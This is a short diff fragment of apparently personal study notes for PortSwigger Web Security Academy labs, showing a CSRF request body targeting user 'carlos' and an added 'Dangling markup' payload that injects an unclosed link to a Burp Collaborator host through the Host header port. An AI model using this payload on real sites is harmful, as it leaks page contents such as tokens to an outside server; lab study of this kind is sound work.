@@ -215,3 +215,7 @@ csrf=oF9QIMKSNOi2DdlDlulr82RTOLxHuWiv&username=carlos
 ```
 
 IMPORTANT: CHANGE modified group 1 req 2 REQ METHOD BACK AND FORTH ONCE IF NEEDED!
+
+Dangling markup:
+
+Host: 0a42005f03d221bec0c45997001600ce.web-security-academy.net:'<a href="http://burp-collaborator.com?
